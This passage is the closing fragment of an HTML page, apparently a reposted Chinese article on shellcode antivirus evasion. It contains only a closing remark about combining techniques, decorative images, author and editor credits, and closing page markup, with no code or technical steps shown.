UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">技巧方法是死的，思路是活，在实际环境下也需要各位师傅将多个技巧结合灵巧的思路达到想要的成果。</p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/7_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="visibility: visible !important;width: 640px !important;"  /></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">原创投稿作者：卿</span></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">作者博客：</span><span style="font-size:12px;line-height:32px;;">https://www.cnblogs.com/-qing-/</span></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">本文由公众号HACK学习排版编辑整理</span></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/8_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>